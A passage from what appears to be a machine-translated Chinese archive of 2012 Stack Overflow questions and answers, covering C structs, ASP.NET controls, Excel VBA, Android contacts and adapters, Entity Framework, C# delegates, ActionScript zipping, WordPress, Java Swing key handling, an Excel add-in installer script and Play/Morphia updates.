> 时间：2012-05-15T16:22:11.483

错误的*原因*是，当你到达这里

```
void startTimer( struct Timer* ptimer ) 
```

范围内没有`struct Timer`（只是匿名结构的 typedef）。所以编译器认为你想要声明一个*新*类型`struct Timer`并使用指向它的指针作为参数。

实际上这样做并没有多大用处，因为类型只会在函数*内部可见。*这将使得从函数*外部*传入参数几乎是不可能的。

所以编译器说，虽然语言可能允许，但这看起来不是一个好主意！

# c# - 为什么我不能在 PostBack 上更新 HiddenFields？

> ID：10603185
> 
> 赞同：3
> 
> 时间：2012-05-15T14:43:31.113
> 
> 标签：c#, .net, user-controls, webforms

这是我的代码：

```
private string[] MesiSelezionati;

protected void Page_Load(object sender, EventArgs e)
{
    MesiSelezionati = new string[] { "2", "4" };
    UpdateMesi();
}

override protected void OnInit(EventArgs e)
{
    for (int i = 1; i <= 12; i++)
    {
        HtmlGenericControl meseItem = new HtmlGenericControl("a") { InnerHtml = "mese" };
        meseItem.Attributes.Add("href", "javascript:void(0);");

        HiddenField hf = new HiddenField();
        hf.Value = "0";
        hf.ID = "idMese_" + i.ToString();

        meseItem.Controls.Add(hf);

        panelMesi.Controls.Add(meseItem);
    }

    base.OnInit(e);
}

private void UpdateMesi()
{
    foreach (HtmlGenericControl a in panelMesi.Controls.OfType<HtmlGenericControl>())
    {
        HiddenField hf = a.Controls.OfType<HiddenField>().LastOrDefault();
        if (MesiSelezionati.Contains(hf.ID.Split('_').LastOrDefault()))
        {
            hf.Value = "1";
            a.Attributes.Add("class", "box-ricerca-avanzata-item link-box selected");
        }
    }
} 
```

当我调用页面时，一切正常！问题是当我调用同一个页面（所以，回发）时，多亏了 asp:LinkBut​​ton。我得到一个`System.NullReferenceException`。`if (MesiSelezionati.Contains(hf.ID.Split('_').LastOrDefault()))`

似乎 2° 和 4° 链接的 HiddenField（对应于 的位置`MesiSelezionati = new string[] { "2", "4" };`）为空。为什么？我该如何解决？

# 编辑：马克 M 的代码

```
HtmlGenericControl optionBox = new HtmlGenericControl("div");
optionBox.Attributes["class"] = "option-box";

HtmlGenericControl optionBoxItem = new HtmlGenericControl("a") { InnerHtml = "&nbsp;" };
optionBoxItem.Attributes.Add("href", "javascript:void(0);");
optionBoxItem.Attributes.Add("class", "option-box-item");

HtmlGenericControl optionBoxTesto = new HtmlGenericControl("a") { InnerText = Categoria.Categoria };
optionBoxTesto.Attributes.Add("href", "javascript:void(0);");
optionBoxTesto.Attributes.Add("class", "option-box-testo");

HiddenField hf = new HiddenField();
hf.Value = "0";
hf.ID = "categoria_" + Categoria.UniqueID;

optionBox.Controls.Add(optionBoxItem);
optionBox.Controls.Add(optionBoxTesto);
optionBox.Controls.Add(hf);

panelCategorieGuida.Controls.Add(optionBox); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T14:50:22.113

您可以在回发时更新隐藏字段，而不是在加载之前。执行 OnInit 时，尚未使用请求和视图状态值填充控件。您的更新正在被覆盖。

编辑：我找到了问题的根本原因并在此过程中学到了一些东西。

1.  `InnerHtml = "mese"`在 OnInit 方法中设置锚标记 ( ) 的 InnerHtml 属性。在幕后，这项任务是`ViewState["innerhtml"] = "mese"`。
2.  在 ViewState 跟踪开始后，您将 css 类分配给锚点，因此 ViewState 恢复机制将在回发时应用于此控件。

当您回发带有添加的 css 类的锚标记时，将受制于 HtmlContainerControl.LoadViewState（发生在 InitComplete 和 PreLoad 之间）。如果 LoadViewState 方法检测到 ViewState["innerhtml"] 有一个值，它会清除控件的所有子控件（调用 Controls.Clear()）并创建一个 LiteralControl 来包含 innerhtml 值，并将其添加为唯一的子控件。

基本上，这意味着您不能同时设置 InnerHtml 属性并将任何控件添加到 HtmlContainerControl 的后代，如果该控件将受到 ViewState 跟踪。

修正你的榜样；而不是设置 InnerHtml 来添加链接文本，而是使用所需的文本创建一个 LiteralControl 并将其添加到锚的子控件集合中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T17:40:13.377

您的链接按钮在某个单独的面板控件中吗？是否可以使用 AJAX 进行部分回发？很抱歉回答这个问题。

# excel - Excel宏中的“范围（“F：F”）”是什么意思？

> ID：10603186
> 
> 赞同：5
> 
> 时间：2012-05-15T14:43:41.043
> 
> 标签：excel, vba

我正在调试一个宏并且对它们几乎没有经验，f：f是什么意思？我理解第一个范围，我猜 f:f 表示当前选择的范围，但这只是一个猜测。

```
 ws.Range("A1:M65536").ClearContents
       ws.Range("F:F").FormatConditions.Delete 
```

有人可以为我澄清一下吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-15T14:44:51.020

这意味着整个`F`列的范围。`F:H`是列`F`，`G`等等`H`。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-05-15T14:44:57.280

`F:F`表示整个`F`列。

# android - 以编程方式修改本机联系人

> ID：10603187
> 
> 赞同：0
> 
> 时间：2012-05-15T14:43:47.043
> 
> 标签：android, contacts

我正在尝试以编程方式修改联系人的名字和姓氏。我用来完成这项工作的代码片段如下：

```
operations.add( ContentProviderOperation.newUpdate( Data.CONTENT_URI )
  .withSelection( RawContacts._ID + "=?",
  new String[] { String.valueOf( mSmartphoneContactKey) } )
    .withValue( ContactsContract.CommonDataKinds.StructuredName.GIVEN_NAME,
     mContactName.getEditableText().toString() )
      .withValue( ContactsContract.CommonDataKinds.StructuredName.FAMILY_NAME,
        mContactLastName.getEditableText().toString() )                          
        .build() ); 
```

用`mSmartphoneContactKey`列中包含的数据填充

```
ContactsContract.Contacts._ID 
```

当我使用内容提供程序读取联系人时，它位于我的投影数组中。

问题是某些联系人的姓名和姓氏没有被修改，而是被修改了电话类型。实际上，我对原因没有任何线索。任何建议表示赞赏。

* * *

我已经进一步阅读了 Data 表是我必须使用的文档。我已将代码修改如下...仍然无法正常工作

```
 operations.add( ContentProviderOperation.newUpdate( Data.CONTENT_URI )
                .withSelection( Data._ID + " = ? AND " + ContactsContract.Data.MIMETYPE + "='" + ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE + "'",
                         new String[] { String.valueOf( mSmartphoneContactId ) } )
                         .withValue( ContactsContract.CommonDataKinds.StructuredName.GIVEN_NAME, mContactName.getEditableText().toString() )
                         .withValue( ContactsContract.CommonDataKinds.StructuredName.FAMILY_NAME, mContactLastName.getEditableText().toString() )                            
                         .build() ); 
```

请帮我！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T14:35:04.537

好的 解决了！错误的ID通过了。需要从 DATA 表中沿着数据检索 ID。

# visual-studio-2010 - 实体框架约束基数

> ID：10603188
> 
> 赞同：0
> 
> 时间：2012-05-15T14:43:49.420
> 
> 标签：visual-studio-2010, entity-framework, c#-4.0

如何对实体框架进行约束以读取从表汽车到车辆的外键关系（例如）`0..1 -> 1`而不是`* -> 1`？

我有桌子

```
create TABLE [dbo].[Vehicles](
  [Id] [int] IDENTITY(1,1) NOT NULL primary key,
  <rest of the columns>
)

create TABLE [dbo].[Cars](
  [Id] [int] NOT NULL,
  <rest of the columns>
) 
```

和外键：

```
alter table [Cars] add foreign key(id) references [Vehicles](id) 
```

当我从数据库创建模型时，它被创建为`* -> 1`我无法更改：

![在此处输入图像描述](../Images/ad15bca6731cb0f92b055a38e895c6c9.png)

我知道我手动更改了两个实体之间的关联，但这并不重要，因为它不会更改约束

我需要这样做来设置 to 的 baseType 属性`Cars`来`Vehicle`实现继承。

目前我收到此错误：

> 多重性在关系“FK__BoatsTPT__Id__117F9D94”中的角色“BoatsTPT”中无效。因为 Dependent Role 指的是关键属性，所以 Dependent Role 的多重性的上限必须为 1。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-16T08:39:56.960

您必须首先使表`Id`中`Cars`的列成为主键，否则它不是一对一的关系。

# c# - 可空函数

> ID：10603195
> 
> 赞同：6
> 
> 时间：2012-05-15T14:44:28.383
> 
> 标签：c#, func

在 C# 中是否可以将方法传递给可为空的 Func？

既不工作`Func<A, bool>?`也不`Func?<A, bool>`工作。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-05-15T14:45:45.767

那没有意义。
所有引用类型，包括`Func<...>`，都可以是`null`。

可空类型适用于`struct`通常不能是 的值类型 (s) `null`。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-15T14:47:36.067

Func 是一个委托，它是一个引用类型。这意味着它已经可以为空（您可以将 null 传递给方法）。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-15T14:57:29.243

[Func](http://msdn.microsoft.com/en-us/library/bb534960.aspx) -> 封装返回泛型参数指定类型的方法

如果返回类型为 void，则存在不同的委托 (Action)

[Action](http://msdn.microsoft.com/en-us/library/system.action) -> 封装一个不返回值的方法。

如果要求 Func 接受可以接受 null（可空类型）的参数，或者要求 Func 返回可能为 null（可空类型）的值，则没有限制。

例如。

```
 Func<int?, int?, bool> intcomparer = 
    (a,b)=>
    {
    if(a.HasValue &&b.HasValue &&a==b) 
        return true;
        return false;
    } ;

    Func<int?, int?, bool?> nullintcomparer = 
    (a,b)=>
    {

    if(a.HasValue &&b.HasValue &&a==b) 
        return true;
    if(!a.HasValue || !b.HasValue)
       return null;
        return false;
    } ;

    var result1 = intcomparer(null,null); //FALSE
    var result2 = intcomparer(1,null); // FALSE
    var result3 = intcomparer(2,2); //TRUE

    var result4 = nullintcomparer(null,null); // null
    var result5 = nullintcomparer(1,null); // null
    var result6 = nullintcomparer(2,2); //TRUE 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2019-11-22T10:03:51.657

# C# 1.0 - 7.x：

所有引用类型，包括作为委托的 Func，默认情况下都可以为 null。

# C# > 8.x:

`Func<T>`必须标记为`Func<T>?`能够接收`null`默认参数值。

# C# 1.0 - 7.x 的示例：

```
/// <summary>
/// Returns an unique absolute path based on the input absolute path.
/// <para>It adds suffix to file name if the input folder already has the file with the same name.</para>
/// </summary>
/// <param name="absolutePath">An valid absolute path to some file.</param>
/// <param name="getIndex">A suffix function which is added to original file name. The default value: " (n)"</param>
/// <returns>An unique absolute path. The suffix is used when necessary.</returns>
public static string GenerateUniqueAbsolutePath(string absolutePath, Func<UInt64, string> getIndex = null)
{
    if (getIndex == null)
    {
        getIndex = i => $" ({i})";
    }
    // ... other logic
} 
```

# >C# 8.x 的示例：

```
/// <summary>
/// Returns an unique absolute path based on the input absolute path.
/// <para>It adds suffix to file name if the input folder already has the file with the same name.</para>
/// </summary>
/// <param name="absolutePath">An valid absolute path to some file.</param>
/// <param name="getIndex">A suffix function which is added to original file name. The default value: " (n)"</param>
/// <returns>An unique absolute path. The suffix is used when necessary.</returns>
public static string GenerateUniqueAbsolutePath(string absolutePath, Func<UInt64, string>? getIndex = null)
{
    if (getIndex == null)
    {
        getIndex = i => $" ({i})";
    }
    // ... other logic
} 
```

# actionscript-3 - 使用 fzip 压缩文件夹

> ID：10603199
> 
> 赞同：1
> 
> 时间：2012-05-15T14:44:32.557
> 
> 标签：actionscript-3

我正在尝试将文件夹压缩为 .zip 文件。我正在使用 FZip 库。这是我到目前为止所拥有的：

```
var zip:FZip = new FZip();
zip.addFile("Users/Vincent/Desktop/test/", null); 
```

我桌面上的文件夹 test 是我要压缩的文件夹。

现在我想压缩该文件夹并将压缩文件放在我的桌面上，但他们正在谈论 byteArrays 等，我不知道该怎么做。有人可以帮帮我吗？[在此处输入链接描述](http://codeazur.com.br/lab/fzip/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T16:35:55.807

这是一个工作示例，为了简短起见，我使用了很多匿名函数。

```
package {
import deng.fzip.FZip;

import flash.display.Sprite;
import flash.events.Event;
import flash.events.MouseEvent;
import flash.net.FileReference;
import flash.net.FileReferenceList;
import flash.utils.ByteArray;

public class ZipTest extends Sprite {
    private var imageRefList : FileReferenceList = new FileReferenceList();
    private var saveRef : FileReference = new FileReference();
    private var zipName : String = "someName.zip";

    public function ZipTest() {
        var someButton : Sprite = new Sprite();
        with(someButton.graphics) {
            beginFill(0x00ff00);
            drawRect(0, 0, 50, 50);
            endFill();
        }
        addChild(someButton).addEventListener(MouseEvent.CLICK, function(event : MouseEvent) : void {
            var saveZip : Function = function(zip : FZip) : void {
                var out : ByteArray = new ByteArray();
                zip.serialize(out);

                saveRef.addEventListener(Event.COMPLETE, function(e : Event) : void {
                    trace("done");
                });
                saveRef.save(out, zipName);
            };

            imageRefList.addEventListener(Event.SELECT, function(e : Event) : void {
                var zip : FZip = new FZip();
                var count : int = imageRefList.fileList.length;
                for each (var image: FileReference in imageRefList.fileList) {
                    image.addEventListener(Event.COMPLETE, function(e : Event) : void {
                        var img : FileReference = FileReference(e.target);
                        trace(count + " loaded... " + img.name);
                        zip.addFile(img.name, img.data);

                        count--;
                        if (count == 0) saveZip(zip);
                    });
                    trace("load: " + image.name);
                    image.load();
                }
            });
            imageRefList.browse();
        });
    }
} 
```

}

# php - 在wordpress中显示所有帖子的网址是什么？

> ID：10603200
> 
> 赞同：14
> 
> 时间：2012-05-15T14:44:37.670
> 
> 标签：php, wordpress

我只是想要一个指向我的博客档案的链接。它们只是普通的帖子，但我似乎找不到合适的网址让它们添加到我的菜单中。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2018-04-08T08:50:03.783

正确的 url 让他们添加到我的菜单中。

[http://yourwebsite.com/?post_type=post](http://yourwebsite.com/?post_type=post)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-02-26T17:30:50.703

您不必对每个帖子都使用一个类别。

实际上，列出任何类别和日期的所有帖子的文件是 index.php。您只需按照 codex 上的说明编写“循环”。

因此，如果您更改了 index.php 以使其成为一个精美的页面，而不仅仅是帖子列表，那么现在您正在尝试创建另一个页面来为您做这件事。

所以，如果你跟着我，你做错了。您应该做的是创建一个单独的页面并将其指定为您博客的主页。然后它将释放 index.php 文件供您将其用作博客列表，默认情况下是这样。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2019-10-07T19:09:39.717

假设您以正确的方式进行操作（如 Guilherme 所述），您应该有一个指定为博客列表页面的页面。

如果使用“我的博客”页面显示帖子和漂亮的链接，则博客列表的 URL 应该类似于[http://mywebsite.com/my-blog](http://mywebsite.com/my-blog)。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-07-15T07:34:41.340

```
<?php  if ( is_front_page() && is_home() ) {
// Default homepage
echo "Default homepage";

} elseif ( is_front_page()){

    echo "Static homepage";
// Static homepage

} elseif ( is_home()){
    echo "Blog page";
// Blog page

} elseif ( is_page( 'cart' ) || is_cart()){
    echo "cart";
// Blog page

}  elseif (is_single()){
    echo "is_single";
// Blog page

} elseif (is_product_category()){
    echo "is_product_category";
} 
 else {
echo "Everything else";
// Everything else
}  ?> 
```

# java - 如何在 Java 中使用 KeyListener？

> ID：10603203
> 
> 赞同：1
> 
> 时间：2012-05-15T14:44:42.613
> 
> 标签：java, swing

如何在此代码上使用 KeyListener 上下移动？我知道如何使用 KeyListener，但我不知道它把它放在这段代码的什么地方。

```
 import java.awt.*;
    import java.awt.image.*;
    import java.awt.event.*;
    import java.awt.geom.*;

    import javax.swing.*;

    public class ControlPanel extends JPanel implements Runnable,ActionListener,KeyListener,MouseListener{
        private MainPanel main;
        private final static int maxWidth = 800, maxHeight = 600; //width & height of JPanel
        private boolean running; //keeps track of state of the program
        private Thread thread;
        private Graphics2D graphics;
        private Image image; //used for double buffering
        private BufferedImage bgImage;
        private String s = "";
        Font f = new Font("Times New Roman",Font.PLAIN,50);
        Timer t = new Timer(2000,this);
        private int typed = 0;
        private int x = 50,y = 500;

        public ControlPanel(MainPanel main) {
            this.setDoubleBuffered(false); //we'll use our own double buffering method
            this.setBackground(Color.black);
            this.setPreferredSize(new Dimension(maxWidth, maxHeight));
            this.setFocusable(true);
            this.requestFocus();
            this.main = main;
            addKeyListener(this);
            addMouseListener(this);
            t.start();
        }

        public static void main(String[] args) {
            new MainPanel();
        }

        public void addNotify() {
            super.addNotify();
            startGame();
        }

        public void stopGame() {
            running = false;
        }

        //Creates a thread and starts it
        public void startGame() {
            if (thread == null || !running) {
                thread = new Thread(this);
            }
            thread.start(); //calls run()
        }

        public void run() {
            running = true;

            init();
            while (running) {
                createImage(); //creates image for double buffering

                ///////////////USE THESE 2 METHODS////////////////////
                update(); //use this to change coordinates, update values, etc

                draw(); //use this to draw to the screen

                //////////////////////////////////////////////////////
                drawImage(); //draws on the JPanel
            }

            System.exit(0);
        }

        //Use this to create or initialize any variables or objects you have
        public void init() {
        }
         public void initGame(){

         }

        //Use this to update anything you need to update
        public void update() {

        }

        //Use this to draw anything you need to draw
        public void draw() {        

            graphics.setColor(Color.WHITE);
            graphics.fillRect(250, 450, 300,100);

            graphics.setColor(Color.WHITE);
            graphics.fillRect(250, 320, 300,100);

            graphics.setColor(Color.GREEN);
            graphics.setFont(f);
            graphics.drawString(s, x, y);
            typed = 0;

            graphics.setFont(f);
            graphics.setColor(Color.blue);
            graphics.drawString("HANGMAN", 270,75);

            graphics.setFont(f);
            graphics.setColor(Color.blue);
            graphics.drawString("PLAY", 330, 390);

            graphics.setFont(f);
            graphics.setColor(Color.blue);
            graphics.drawString("QUIT", 330, 520);

            graphics.setColor(Color.red);
            graphics.drawRect(248, 318, 304,104);

        }

        //creates an image for double buffering
        public void createImage() {
            if (image == null) {
                image = createImage(maxWidth, maxHeight);

                if (image == null) {
                    System.out.println("Cannot create buffer");
                    return;
                }
                else
                    graphics = (Graphics2D)image.getGraphics(); //get graphics object from Image
            }

            if (bgImage == null) {
                graphics.setColor(Color.black);
                graphics.fillRect(0, 0, maxWidth, maxHeight);
                //System.out.println("No background image");
            }
            else {
                //draws a background image on the Image
                graphics.drawImage(bgImage, 0, 0, null);
            }
        }

        //outputs everything to the JPanel
        public void drawImage() {
            Graphics g;
            try {
                g = this.getGraphics(); //a new image is created for each frame, this gets the graphics for that image so we can draw on it
                if (g != null && image != null) {
                    g.drawImage(image, 0, 0, null);
                    g.dispose(); //not associated with swing, so we have to free memory ourselves (not done by the JVM)
                }
                image = null;
            }catch(Exception e) {System.out.println("Graphics objects error");}
        }

        public void actionPerformed(ActionEvent e) {
            // TODO Auto-generated method stub

        }

        public void keyPressed(KeyEvent e) {    

        }

        public void keyReleased(KeyEvent e) {

        }

        public void keyTyped(KeyEvent e) {
            typed = 1;

            s+=Character.toString(e.getKeyChar());
            s+=" ";
            System.out.println(s);
        }

        @Override

        public void mouseClicked(MouseEvent e) {
            System.out.println(e.getPoint());

        }

        @Override
        public void mouseEntered(MouseEvent arg0) {
            // TODO Auto-generated method stub

        }

        @Override
        public void mouseExited(MouseEvent arg0) {
            // TODO Auto-generated method stub

        }

        @Override
        public void mousePressed(MouseEvent arg0) {
            // TODO Auto-generated method stub

        }

        @Override
        public void mouseReleased(MouseEvent arg0) {
            // TODO Auto-generated method stub

        }
    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T15:04:08.820

[KeyListener](http://docs.oracle.com/javase/tutorial/uiswing/events/keylistener.html)未指定用于监听[Swing JComponents](http://docs.oracle.com/javase/tutorial/uiswing/components/index.html)的键盘事件，请改用[KeyBindings](http://docs.oracle.com/javase/tutorial/uiswing/misc/keybinding.html)，向 Swing GUI 的输出应来自[Swing Action](http://docs.oracle.com/javase/tutorial/uiswing/misc/action.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T14:50:14.233

您已通过调用此函数添加了关键侦听器      

```
addKeyListener(this); 
```

# c# - 如何从 formView->EditItemTemplate->Textbox 中获取价值？

> ID：10603205
> 
> 赞同：2
> 
> 时间：2012-05-15T14:44:48.127
> 
> 标签：c#, asp.net

所以我有这个 FormView 应该只有 1 条记录进行编辑：

```
 <asp:FormView ID="fmv_accountDetail" runat="server" DataKeyNames="UserID"
        DataSourceID="sds_accountDetail" DefaultMode="Edit" 
        emptydatatext="No employees found." 
        onitemcommand="fmv_accountDetail_ItemCommand"  >
        <EditItemTemplate>
            <asp:Label ID="lbl_UserID" runat="server" Text='<%# Eval("UserID") %>'  Visible="false"></asp:Label>
            <asp:Label ID="lbl_CustomerName" runat="server" Text='<%# Eval("customerName") %>'  Visible="false"></asp:Label>
            <asp:LinkButton ID="UpdateButton" runat="server" CausesValidation="True" 
                CommandName="Update" Text="Update" />
            &nbsp;<asp:LinkButton ID="UpdateCancelButton" runat="server" 
                CausesValidation="False" CommandName="Cancel" Text="Cancel" />
        </EditItemTemplate>

    </asp:FormView> 
```

如何在 C# 中获取 lbl_CustomerName？我想在页面上用这个值填充其他标签。

这是我一直在尝试的，但它说空错误异常：

```
(fmv_accountDetail.FindControl("lbl_CustomerName") as Label).Text; 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-15T17:17:07.943

发现了问题，也很简单：

```
(fmv_accountDetail.Row.FindControl("lbl_CustomerName") as Label).Text; 
```

# android - 如何将语言包添加到 android 操作系统，版本 2.3.3

> ID：10603209
> 
> 赞同：1
> 
> 时间：2012-05-15T14:44:56.713
> 
> 标签：android

我的索尼爱立信 xperia 手机中有 android os 版本 2.3.3。我无法使用手机阅读短信，这是我的“区域”语言。

但我听说，在以后的一些版本中，我们也可以阅读用某种区域语言编写的短信。所以，请告诉我如何将区域语言包添加到 android os 版本 2.3.3。

注意：如果我收到泰米尔语的短信，那么手机应该会自动检测语言并显示泰米尔语的短信。

# android - Android将相对视图添加到合并适配器

> ID：10603210
> 
> 赞同：1
> 
> 时间：2012-05-15T14:44:56.500
> 
> 标签：android, adapter, commonsware-cwac

嗨，我正在尝试将相对视图添加到合并适配器，但它目前正在单独滚动到列表，所以有人知道我如何将带有图像视图和文本视图的相对布局添加到合并适配器？

我的目标是让它看起来像这样

```
header(relativelyout red bar and title);
List
header(relativelyout red bar and title);
List
header(relativelyout red bar and title);
List 
```

并让这一切滚动，就好像它都是一个列表一样

这是我迄今为止的尝试

```
 arrayAdapter = new ArrayAdapter<String>(this, R.layout.single_item, newsList);
    arrayAdapter2 = new ArrayAdapter<String>(this, R.layout.single_item, newsList2);
    arrayAdapter3 = new ArrayAdapter<String>(this, R.layout.single_item, newsList3);

        ListView list = getListView();
           list.setTextFilterEnabled(true);

           LayoutInflater inflater = (LayoutInflater) this.getSystemService(Context.LAYOUT_INFLATER_SERVICE );
            View header = inflater.inflate( R.layout.redcell, list, false);

    setListAdapter (arrayAdapter);

        adapter = new MergeAdapter();
        adapter.addView(header);
        adapter.addAdapter(arrayAdapter);
        adapter.addView(header);
        adapter.addAdapter(arrayAdapter2);
        adapter.addView(header);
        adapter.addAdapter(arrayAdapter3);
        setListAdapter(adapter);

    } 
```

红细胞.xml

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:orientation="vertical"
     android:id="@+id/redcelllayout" >

    <ImageView
        android:id="@+id/imageView1"
        android:layout_width="match_parent"
        android:layout_height="30dp"
        android:src="@drawable/titlerect" />

    <TextView
        android:id="@+id/redheadertext"
        android:layout_width="match_parent"
        android:layout_height="30dp"
        android:layout_alignParentLeft="true"
        android:layout_alignParentTop="true"
        android:gravity="left"
        android:paddingLeft="15dp"
        android:paddingTop="3dp"
        android:textColor="@color/white"
        android:textSize="15dp"
        android:textStyle="bold"/>

</RelativeLayout> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T14:56:51.100

不要在程序中创建它们，而是为该视图创建一个 xml 文件，对其进行扩展，然后将其添加到适配器。

像这样：

```
LayoutInflater inflater = (LayoutInflater) this.getSystemService(Context.LAYOUT_INFLATER_SERVICE);

View header1 = inflater.inflate(R.layout.redbar_title);
View header2 = inflater.inflate(R.layout.redbar_title);
View header3 = inflater.inflate(R.layout.redbar_title);

adapter = new MergeAdapter();
adapter.addView(header1);
adapter.addAdapter(arrayAdapter);
adapter.addView(header2);
adapter.addAdapter(arrayAdapter2);
adapter.addView(header3);
adapter.addAdapter(arrayAdapter3);
setListAdapter(adapter); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T14:46:46.423

将每个列表设置`layout_height`为`wrap_content`，并将所有内容包装在`ScrollView`.

如果您可以将标头作为适配器本身的一部分，作为分隔符，并使用单个列表而不是 3，也许会更容易。

# excel - 带有设置工厂的 excel 2010 加载项设置项目

> ID：10603215
> 
> 赞同：0
> 
> 时间：2012-05-15T14:45:02.193
> 
> 标签：excel, installation, excel-2010, excel-addins

我正在开发一个excel插件。我有序列号（例如 100 个），我想检查何时在 pc 上安装 excel 插件。但是我不能用VS2010安装项目来做，因为它不支持序列号列表存储和检查。

所以我想用设置工厂来做这个，我做了这个链接： [link](http://www.jkp-ads.com/articles/AddinsAndSetupFactory.asp?AllComments=True)

但我有一个问题 excel ； ![在此处输入图像描述](../Images/bc796d17b8b45f5e8ead81e7cd28e17f.png)

如果我选择“是”，excel 将用于打开 .dll，如果选择“否”，它会执行任何操作。

![在此处输入图像描述](../Images/3ab182012986c002dde2366031831f53.png)

和我的设置工厂列表是这样的。 ![在此处输入图像描述](../Images/8a2f52508f363a65e3324533a356b978.png)

我的设置工厂“在安装后脚本上”，我的 Addinfilename 值为“Posta Guvercini Excel AddIn For 2010.dll”

```
 -- Determine registry key (2 = HK CURRENT USER)
sVersions = Registry.GetKeyNames(2, "Software\\Microsoft\\Office");

-- Iterate through the registry keys per MS Office-version
--Next line has SetupFactory 8 code
--for iCount1, sVersion in sVersions do    
for iCount1, sVersion in pairs(sVersions) do    

    -- Try opening the registry key
    sSubKey = "Software\\Microsoft\\Office\\"..sVersion..
              "\\Excel\\Options\\"
    sValues = Registry.GetValueNames(2, sSubKey);

    --initialize index counter
    iIndex = -2
    if sValues then

        --Determine the index of the maximimum OPEN registry entry
        --Next line has SetupFactory 8 code
        --for iCount2, sValue in sValues do
        for iCount2, sValue in pairs(sValues) do

            if (String.Left(sValue, 4) == "OPEN") then            
                --Check whether the user did not already install
                --the same add-in to prevent errors when opening Excel
                sKeysValue = Registry.GetValue(2, sSubKey, sValue, true)  
                if String.Find(sKeysValue, SessionVar.Expand(
                              "%AddinFileName%"), 1, false) > 0 then
                    iIndex = -1
                    -- leave loop
                    break;
                else
                    if (sValue == "OPEN") then
                        iIndex = 0
                    else
                        iIndex = String.ToNumber(String.Mid(
                                 sValue, 5, String.Length(sValue)-4))
                    end;
                end;
            end;
        end;

        -- -1 means: This add-in is already installed; we're done
        if iIndex ~= -1 then        
            --Determine path based on variable "%AddinFileName%
            sAppPath = String.Char(34)..
                       SessionVar.Expand("%AppFolder%")..
                       "\\"..
                       SessionVar.Expand("%AddinFileName%")..
                       String.Char(34)

            -- -2 is the initialized value of the index counter
            if (iIndex == -2) then
                -- OPEN-key does not exist
                Registry.SetValue(2, sSubKey, "OPEN",
                                  sAppPath, REG_SZ)
            else
                Registry.SetValue(2, sSubKey, "OPEN"..(iIndex + 1),
                                  sAppPath, REG_SZ)
            end;
        end;
    end;
end; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T18:34:05.037

看起来您正在构建一个自动化插件。
如果是这样，您需要在插件名称前加上 /A 以告诉 Excel 它是一个自动化插件。否则它期待 XLL 或 XLA 或 XLAM

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-24T15:17:59.143

我解决了这个问题。在进行excel安装时，我们必须使用注册表记录。

```
result = Registry.SetValue( HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Office\\Excel\\Addins\\company" , "LoadBehavior" , "3" , REG_DWORD );
result = Registry.SetValue(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Office\\Excel\\Addins\\company" ,"FriendlyName", "program name", REG_SZ);
result = Registry.SetValue( HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Office\\Excel\\Addins\\company" , "Description" , "program name" , REG_SZ );
result = Registry.SetValue(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Office\\Excel\\Addins\\company" ,"Manifest", SessionVar.Expand("%AppFolder%\\myvtofile.vsto|vstolocal"), REG_SZ); 
```

用于在 excel 启动时启动加载项。

LoadBehavior 键的值应为“3”。

# java - 在带有 Morphia 的 PlayFramework 中，如何更新对象？

> ID：10603217
> 
> 赞同：0
> 
> 时间：2012-05-15T14:45:10.790
> 
> 标签：java, playframework, morphia

玩 1.2.4 Morphia 1.2.6a

在太多天里，我试图以几种不同的方式更新记录。我已经阅读了几本书，几乎查看了关于 Play 的所有评论，但我仍然无法弄清楚这一点。？？？

**型号**：

```
@Entity
public class MyModel extends Model{
   public String fullname;
   public String email;
} 
```

**路线**：

```
PUT /test1/? Application.Update1(format:'json')
PUT /test2/? Application.Update2(format:'json')
PUT /test3/? Application.Update2(format:'json') 
```

**控制器**：

```
public static void Update1(MyModel mydata){
}

public static void Update2(JsonObject json){
}

public static void Update3(@Valid MyModel mydata){
} 
```

**发送**：

```
PUT
Content-Type: application/json
Accept: application/json
{ "id": "4fa932fa036494e78debbc14",
  "fullname" : "test"
} 
```

调用Update1、Update2、Update3，均报异常退出。

**呼叫更新1：**

```
Oops: RuntimeException
An unexpected error occured caused by exception RuntimeException: play.exceptions.UnexpectedException: Unexpected Error

play.exceptions.UnexpectedException: Unexpected Error
    at play.mvc.ActionInvoker.invoke(ActionInvoker.java:258)
    at Invocation.HTTP Request(Play!)
Caused by: java.lang.RuntimeException: play.exceptions.UnexpectedException: Unexpected Error
    at play.modules.morphia.Model.create(Model.java:73) 
```

**呼叫更新2：**

```
NullPointerException occured : null

play.exceptions.JavaExecutionException
    at play.mvc.ActionInvoker.invoke(ActionInvoker.java:231)
    at Invocation.HTTP Request(Play!)
Caused by: java.lang.NullPointerException
    at controllers.ApplicationController.Update2(ApplicationController.java:49)
    at play.mvc.ActionInvoker.invokeWithContinuation(ActionInvoker.java:548)
